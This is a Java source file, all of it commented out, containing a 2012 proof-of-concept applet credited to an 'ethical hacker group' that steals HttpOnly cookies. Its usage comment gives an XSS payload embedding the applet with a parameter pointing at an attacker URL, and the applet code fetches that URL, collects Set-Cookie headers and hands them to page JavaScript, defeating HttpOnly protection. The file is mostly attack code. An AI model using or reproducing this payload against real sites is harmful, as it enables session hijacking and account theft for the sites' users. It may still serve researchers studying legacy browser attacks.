/**
 * Created with IntelliJ IDEA.
 * User: heroc
 * Date: 18-7-25
 * Time: 下午4:24
 * To change this template use File | Settings | File Templates.
 *//*

*/
/*
HttpOnly Applet -  Stealing HttpOnly Cookie
by Aung Khant, YGN Ethical Hacker Group, http://yehg.net/
2012-05-19
Usage:
<script>var ck= "";function getc(s){ck = s;alert("XSS HttpOnly-Cookie Stealer:\n\n" + ck);}</script><applet code=HO.class archive=HO.jar width=0 height=0><param name=u value=http://attacker.in/xss/cookie.php></applet>
*//*

import javax.swing.*;
import netscape.javascript.*;
import java.net.*;
public class ttt extends JApplet {
    JSObject win;
    String target, strcookies;
    public void init() {
        win = JSObject.getWindow(this);
        target = getParameter("u");
        strcookies = "";
        try {
            SwingUtilities.invokeAndWait(new Runnable() {
                public void run() {
                    try{
                        URL url = new URL(target);
                        URLConnection connection = url.openConnection();
                        connection.connect();
                        String headerName = null;
                        for (int i=1; (headerName =connection.getHeaderFieldKey(i))!=null; i++) {
                            if (headerName.equals("Set-Cookie") ||headerName.equals("Set-Cookie2")) {
                                String cookie = connection.getHeaderField(i);
                                String cookieName = cookie.substring(0, cookie.indexOf("="));
                                String cookieValue =cookie.substring(cookie.indexOf("=") + 1, cookie.length());
                                strcookies = strcookies + cookieName + "=" +cookieValue + "\n";
                            }
                        }
                        Object results[];
                        results = new Object[1];
                        results[0] = strcookies;
                        win.call("getc",  results);
                    }catch(Exception ex){
                        ex.printStackTrace();
                    }
                }
            });
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}*/
